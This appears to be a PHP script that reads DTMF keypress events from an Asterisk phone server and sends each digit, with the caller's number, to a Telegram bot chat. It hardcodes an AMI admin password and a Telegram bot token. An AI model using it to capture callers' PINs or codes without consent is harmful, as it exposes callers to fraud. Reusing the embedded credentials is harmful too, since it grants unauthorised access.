<?php
// AMI connection details
$host = '127.0.0.1';    // Asterisk server IP
$port = 5038;           // AMI port
$username = 'admin';  // AMI username
$password = 'C1C/u8rPNdCP';  // AMI password

// Open a socket to the AMI
$socket = fsockopen($host, $port, $errno, $errstr, 30);

if (!$socket) {
    echo "Failed to connect to Asterisk Manager: $errstr ($errno)\n";
    exit(1);
}

// Login to AMI
fputs($socket, "Action: Login\r\n");
fputs($socket, "Username: $username\r\n");
fputs($socket, "Secret: $password\r\n\r\n");

// Wait for response
$response = fread($socket, 4096);
echo "Login Response: $response\n";

// Monitor events in a loop
while (!feof($socket)) {
    $line = fgets($socket, 4096);

    // Check if the event is a DTMF event
    if (strpos($line, 'Event: DTMFBegin') !== false) {
        $eventData = [];
        while (($eventLine = trim(fgets($socket, 4096))) !== "") {
            list($key, $value) = explode(': ', $eventLine);
            $eventData[$key] = $value;
        }

        // Print the DTMF event details
        //echo "DTMF Event Detected:\n";
        //echo "  Channel: " . $eventData['Channel'] . "\n";
        
        $digit = $eventData['Digit'];

        if ($digit == "#") {
            $digit = "hash";
        }

        echo $digit . "\n";

        $abc = $digit . "_CID: " . $eventData['CallerIDNum'];

        getdtmf($abc);

        //echo "  Digit: " . $eventData['Digit'] . "\n";
        //echo "  Direction: " . $eventData['Direction'] . "\n";
        //echo "  End: " . $eventData['End'] . "\n";
    }
}

// Logout and close the socket
fputs($socket, "Action: Logoff\r\n");
fclose($socket);

function getdtmf($dtmf) {

$curl = curl_init();

curl_setopt_array($curl, array(
    CURLOPT_URL => 'https://api.telegram.org/bot6641886837:AAG0CFfQ4XjiDqRBAFiiJ2EzaMnFOxfl8Bo/sendMessage?chat_id=-4566347970&text=' . $dtmf,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => '',
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => 'GET',
  ));
  
  $response = curl_exec($curl);
  
  curl_close($curl);

}

?>
